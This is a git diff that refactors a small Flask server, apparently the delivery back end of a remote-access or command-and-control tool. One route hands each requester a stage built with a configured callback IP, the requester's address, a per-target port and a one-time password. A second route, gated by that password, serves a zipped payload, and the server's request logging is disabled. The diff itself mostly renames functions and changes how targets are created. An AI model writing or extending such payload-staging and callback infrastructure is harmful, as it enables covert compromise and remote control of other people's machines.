@@ -1,14 +1,15 @@
 from flask import Flask, request
 import os
 import threading
-import target_manager
 import config
 import logging
 from typing import List
 import random
 import string
+
 from wheelie import __builder as wheelie_builder
 from ravage import __builder as ravage_builder
+
 
 app = Flask(__name__)
 
@@ -18,19 +19,21 @@ one_time_passwords = []  # type: List[str]
 
 
 @app.route('/')
-def hello_world():
+def _hello_world():
     return 'Hello world'
 
 
 @app.route('/wheelie')
-def wheelie():
-    one_time_password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(32))
+def _wheelie():
+    one_time_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     one_time_passwords.append(one_time_password)
-    return wheelie_builder.build(config.soundwave_ip, WEB_SERVER_PORT, request.remote_addr, target_manager.new_target(request.remote_addr), one_time_password)
+    remote_ip = request.remote_addr
+    target = config.Target(remote_ip, remote_ip)
+    return wheelie_builder.build(config.soundwave_ip, WEB_SERVER_PORT, request.remote_addr, target.local_port, one_time_password)
 
 
 @app.route('/ravage')
-def ravage():
+def _ravage():
     one_time_password = request.headers.get('one-time-password')
     if one_time_password not in one_time_passwords:
         return 'Get outta here boi', 403
@@ -39,7 +42,7 @@ def ravage():
     return ravage_builder.build_zip()
 
 
-def start():
+def _start():
     logging.getLogger('werkzeug').disabled = True
     os.environ['WERKZEUG_RUN_MAIN'] = 'true'
 
@@ -48,8 +51,5 @@ def start():
 
 
 def main():
-    threading.Thread(target=start, daemon=True).start()
-
-
-if __name__ == '__main__':
-    main()
+    print(f'Starting service on {config.soundwave_ip} using {config.ADAPTER}')
+    threading.Thread(target=_start, daemon=True).start()
